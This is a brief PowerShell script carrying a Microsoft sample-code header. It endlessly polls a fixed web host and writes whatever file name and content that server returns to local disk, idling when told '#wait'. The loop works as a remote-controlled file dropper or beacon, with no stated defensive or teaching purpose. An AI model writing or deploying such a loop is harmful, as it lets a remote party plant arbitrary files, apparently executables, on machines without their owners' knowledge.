#  Copyright (c) Microsoft Corporation.  All rights reserved.
#  
# THIS SAMPLE CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND,
# WHETHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A PARTICULAR PURPOSE.
# IF THIS CODE AND INFORMATION IS MODIFIED, THE ENTIRE RISK OF USE OR RESULTS IN
# CONNECTION WITH THE USE OF THIS CODE AND INFORMATION REMAINS WITH THE USER.
$webip = "192.168.0.16"
while($True){
	$page = Invoke-WebRequest $webip -usebasicparsing
	$count = 0
	if(($page.content -split '\n')[0].contains("#wait")){
		sleep 180
	}else{
		$content = ($page.content -split "`n")
		$fn = $content[0]
		$executable = $content[1..$content.count] > $fn
		sleep 180
	}
}